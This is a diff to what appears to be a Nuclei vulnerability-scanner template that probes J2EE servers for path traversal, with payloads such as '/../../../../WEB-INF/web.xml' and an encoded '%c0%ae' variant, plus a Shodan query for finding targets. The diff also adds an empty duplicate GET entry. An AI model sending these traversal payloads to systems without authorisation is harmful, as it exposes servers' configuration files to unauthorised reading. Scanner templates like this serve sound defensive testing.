@@ -13,7 +13,6 @@ info:
     max-request: 14
     shodan-query: http.title:"J2EE"
   tags: lfi,generic,j2ee
-
 flow: http(1) && http(2)
 
 http:
@@ -31,9 +30,11 @@ http:
         internal: true
 
   - method: GET
+
   - method: GET
     path:
       - "{{BaseURL}}{{paths}}"
+
     payloads:
       paths:
         - "/../../../../WEB-INF/web.xml"
@@ -49,7 +50,6 @@ http:
         - "/.//WEB-INF/web.xml"
         - "/../WEB-INF/web.xml"
         - "/%c0%ae/WEB-INF/web.xml"
-
     stop-at-first-match: true
 
     matchers-condition: and
